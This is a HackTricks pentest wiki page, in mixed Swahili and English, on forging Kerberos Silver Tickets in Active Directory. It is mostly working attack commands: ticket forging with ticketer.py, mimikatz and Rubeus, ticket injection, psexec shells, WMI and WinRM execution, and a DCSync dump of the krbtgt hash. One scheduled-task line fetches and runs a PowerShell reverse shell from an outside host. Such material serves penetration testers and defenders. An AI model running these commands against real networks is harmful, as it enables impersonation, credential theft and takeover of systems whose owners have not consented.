# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na uanze kupata zawadi hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

Shambulio la **Silver Ticket** linahusisha unyakuzi wa tiketi za huduma katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama akaunti ya kompyuta, ili kuunda tiketi ya Ticket Granting Service (TGS). Kwa tiketi hii iliyoundwa, mshambuliaji anaweza kufikia huduma maalum kwenye mtandao, **akijifanya kuwa mtumiaji yeyote**, kwa kawaida akilenga mamlaka ya usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa ajili ya kuunda tiketi ni salama zaidi na si rahisi kugundulika.

Kwa ajili ya kuunda tiketi, zana tofauti hutumika kulingana na mfumo wa uendeshaji:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Kwenye Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.

## Available Services

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika matukio mengine unaweza tu kuuliza: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Abusing Service tickets

In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.

### CIFS

With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Utapata pia uwezo wa kupata shell ndani ya mwenyeji au kutekeleza amri zisizo na mpangilio kwa kutumia **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Kwa ruhusa hii unaweza kuunda kazi zilizopangwa katika kompyuta za mbali na kutekeleza amri zisizo na mpangilio:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathirika**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pata **maelezo zaidi kuhusu wmiexec** katika ukurasa ufuatao:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Kwa ufikiaji wa winrm juu ya kompyuta unaweza **kuipata** na hata kupata PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Angalia ukurasa ufuatao kujifunza **njia zaidi za kuungana na mwenyeji wa mbali kwa kutumia winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Kumbuka kwamba **winrm lazima iwe hai na inasikiliza** kwenye kompyuta ya mbali ili kuweza kuipata.

### LDAP

Kwa ruhusa hii unaweza kutupa database ya DC kwa kutumia **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:

## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Ushauri wa bug bounty**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi katika [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na uanze kupata zawadi hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
